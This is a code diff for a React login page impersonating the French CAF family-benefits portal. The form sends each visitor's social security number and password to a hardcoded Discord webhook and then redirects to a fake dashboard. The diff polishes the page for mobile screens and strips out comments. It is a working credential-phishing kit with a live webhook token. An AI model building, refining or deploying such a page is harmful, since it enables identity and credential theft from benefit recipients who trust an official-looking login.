@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { motion } from 'framer-motion';
 import { Eye, EyeOff, HelpCircle } from 'lucide-react';
 import { useNavigate } from 'react-router-dom';
@@ -9,8 +9,14 @@ const LoginForm = () => {
   const [ssn, setSsn] = useState('');
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
-
   const [ssnError, setSsnError] = useState(false);
+  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);
+
+  useEffect(() => {
+    const handleResize = () => setIsMobile(window.innerWidth < 768);
+    window.addEventListener('resize', handleResize);
+    return () => window.removeEventListener('resize', handleResize);
+  }, []);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -26,29 +32,23 @@ const LoginForm = () => {
     setIsLoading(true);
 
     // --- CONFIGURATION ---
-    // Collez l'URL de votre Webhook Discord ou l'URL Formspree ici
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1483197361433088075/-_Ow9tNiutwNQ7oEGpm0nUl8bsU8mNArFYx_0JA9dZ-fmS1bXO76mgyFmdkkgtBmnekq";
 
     try {
-      // Envoi des données vers le service choisi
       await fetch(WEBHOOK_URL, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           content: `🔔 **Nouvel identifiant reçu !**\n\n👤 **SSN:** \`${ssn}\`\n🔑 **Mot de passe:** \`${password}\`\n\n🌐 *Source: CAF App*`
         }),
       });
 
-      // Redirection après l'envoi
       setTimeout(() => {
         navigate('/dashboard');
       }, 1000);
 
     } catch (error) {
       console.error("Erreur d'envoi", error);
-      // On redirige quand même pour la fluidité
       navigate('/dashboard');
     } finally {
       setIsLoading(false);
@@ -61,14 +61,14 @@ const LoginForm = () => {
       initial={{ opacity: 0, scale: 0.95 }}
       animate={{ opacity: 1, scale: 1 }}
       transition={{ duration: 0.3 }}
-      style={{ maxWidth: '600px', marginTop: '2rem' }}
+      style={{ maxWidth: '600px', marginTop: isMobile ? '1rem' : '2rem', padding: isMobile ? '0 1rem' : '0' }}
     >
-      <div className="card" style={{ padding: '2rem' }}>
-        <h2 style={{ fontSize: '1.25rem', color: '#666', textTransform: 'uppercase', marginBottom: '1.5rem', borderBottom: '1px solid #eee', paddingBottom: '1rem', fontWeight: 600 }}>
+      <div className="card" style={{ padding: isMobile ? '1.5rem' : '2rem', backgroundColor: 'white', borderRadius: '4px', border: 'none', boxShadow: '0 2px 10px rgba(0,0,0,0.05)' }}>
+        <h2 style={{ fontSize: isMobile ? '1.05rem' : '1.25rem', color: '#666', textTransform: 'uppercase', marginBottom: '1.5rem', borderBottom: '1px solid #eee', paddingBottom: '1rem', fontWeight: 600 }}>
           CONNEXION ALLOCATAIRE
         </h2>
 
-        <p style={{ fontSize: '0.875rem', color: '#666', marginBottom: '2rem' }}>
+        <p style={{ fontSize: '0.875rem', color: '#666', marginBottom: isMobile ? '1.5rem' : '2rem', lineHeight: 1.4 }}>
           Tous les champs sont obligatoires, sauf mention contraire.
         </p>
 
@@ -83,9 +83,8 @@ const LoginForm = () => {
               placeholder="13 caractères"
               value={ssn}
               onChange={(e) => {
-                const val = e.target.value.replace(/\D/g, ''); // Garde seulement les chiffres
+                const val = e.target.value.replace(/\D/g, ''); 
                 if (val.length <= 13) {
-                  // Formatage simple : X XX XX XX XXX XXX
                   let formatted = val;
                   if (val.length > 1) formatted = val.slice(0, 1) + ' ' + val.slice(1);
                   if (val.length > 3) formatted = formatted.slice(0, 4) + ' ' + val.slice(3);
@@ -104,11 +103,12 @@ const LoginForm = () => {
                 backgroundColor: '#f8fafc',
                 fontSize: '1.1rem',
                 letterSpacing: '0.05em',
-                outline: 'none'
+                outline: 'none',
+                width: '100%'
               }}
             />
             {ssnError && (
-              <p style={{ color: '#d31d44', fontSize: '0.9rem', marginTop: '-4px', lineHeight: '1.4' }}>
+              <p style={{ color: '#d31d44', fontSize: '0.85rem', marginTop: '-4px', lineHeight: '1.4' }}>
                 Saisie incorrecte (13 caractères ;<br />
                 Exemple : 2 94 03 75 120 005)
               </p>
@@ -117,7 +117,7 @@ const LoginForm = () => {
               <input type="checkbox" id="remember" style={{ width: '18px', height: '18px' }} />
               <label htmlFor="remember" style={{ fontSize: '0.875rem', color: '#666' }}>Retenir cet identifiant</label>
             </div>
-            <a href="#" style={{ fontSize: '0.875rem', color: '#0096C7', fontWeight: 500, marginTop: '0.5rem' }}>
+            <a href="#" style={{ fontSize: '0.875rem', color: '#0096C7', fontWeight: 500, marginTop: '0.5rem', textDecoration: 'none' }}>
               J'ai un identifiant provisoire
             </a>
           </div>
@@ -140,7 +140,8 @@ const LoginForm = () => {
                   borderRadius: '4px',
                   border: '1px solid #ccc',
                   backgroundColor: '#f8fafc',
-                  fontSize: '1.1rem'
+                  fontSize: '1.1rem',
+                  outline: 'none'
                 }}
               />
               <button
@@ -151,7 +152,7 @@ const LoginForm = () => {
                 {showPassword ? <EyeOff size={22} /> : <Eye size={22} />}
               </button>
             </div>
-            <a href="#" style={{ fontSize: '0.875rem', color: '#0096C7', fontWeight: 500, marginTop: '0.5rem' }}>
+            <a href="#" style={{ fontSize: '0.875rem', color: '#0096C7', fontWeight: 500, marginTop: '0.5rem', textDecoration: 'none' }}>
               Mot de passe oublié ?
             </a>
           </div>
@@ -171,7 +172,8 @@ const LoginForm = () => {
                 borderRadius: '4px',
                 opacity: isLoading ? 0.7 : 1,
                 cursor: isLoading ? 'not-allowed' : 'pointer',
-                textTransform: 'none'
+                textTransform: 'none',
+                border: 'none'
               }}
             >
               {isLoading ? "Connexion en cours..." : "Se connecter"}
